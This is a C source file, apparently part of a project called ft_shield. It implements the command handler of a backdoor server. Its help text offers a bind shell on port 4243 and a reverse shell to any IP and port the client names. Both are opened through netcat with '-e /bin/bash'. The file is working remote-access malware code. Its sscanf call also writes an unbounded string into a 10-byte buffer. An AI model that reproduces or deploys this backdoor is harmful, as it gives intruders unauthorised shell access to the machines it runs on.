#include <ft_shield.h>
#include <arpa/inet.h>

static void redirect_fds(int client_fd)
{
    dup2(client_fd, 0);
    dup2(client_fd, 1);
    dup2(client_fd, 2);
}

static void help(t_server* server, int client_fd)
{
    char *help_string = 
    "Commands:\n"
    "  ?                    Show this help message.\n"
    "  shell                Create a bind shell on port 4243.\n"
    "  reverse <IP> <PORT>  Connect to the specified IP address and port, and start a reverse shell.\n"
    "  exit                 Close the current client connection.\n"
    "\n"
    "Options:\n"
    "  <IP>                 The target IP address.\n"
    "  <PORT>               The target port number.\n";
    send_to_client(server, client_fd, help_string);
}

static void shell(t_server* server, int client_fd)
{
    pid_t pid;
    if ((pid = fork()) < 0) {
        send_to_client(server, client_fd, "Error creating bind shell\n");
        remove_client(server, client_fd);
        return ;
    }
    if (pid == 0) {
        redirect_fds(client_fd);
        char *argv[] = {"nc", "-l", "-p", SHELL_PORT, "-e", "/bin/bash", NULL};
        execv("/usr/bin/nc", argv);
    }
    send_to_client(server, client_fd, "Spawning shell on port 4243\n");
    remove_client(server, client_fd);
}

void reverse_shell(t_server *server, int client_fd, char *buffer)
{
    struct sockaddr_in sa;
    char command[10];
    char ip[16];
    char port[6];

    if (sscanf(buffer, "%s %15s %5s", command, ip, port) != 3) {
        send_to_client(server, client_fd, "Insufficient arguments for reverse shell\n");
        return ;
    }
    if (inet_pton(AF_INET, ip, &(sa.sin_addr)) <= 0) {
        send_to_client(server, client_fd, "Invalid ip address\n");
        return ;
    }

    pid_t pid;
    if ((pid = fork()) < 0) {
        send_to_client(server, client_fd, "Error creating reverse shell\n");
        remove_client(server, client_fd);
        return ;
    }
    if (pid == 0) {
        redirect_fds(client_fd);
        char *argv[] = {"nc", "-n", ip, port, "-e", "/bin/bash", NULL};
        execv("/usr/bin/nc", argv);
    }
    char debug_message[50];
    snprintf(debug_message, sizeof(debug_message), "Connecting to %s on port %s\n", ip, port);
    send_to_client(server, client_fd, debug_message);
    remove_client(server, client_fd);
}

void handle_command(t_server* server, int client_fd, char* buffer)
{
    if (!strcmp("?", buffer))
        help(server, client_fd);
    else if (!strcmp("shell", buffer))
        shell(server, client_fd);
    else if (!strncmp("reverse", buffer, 7))
        reverse_shell(server, client_fd, buffer);
    else if (!strcmp("exit", buffer))
        remove_client(server, client_fd);
}
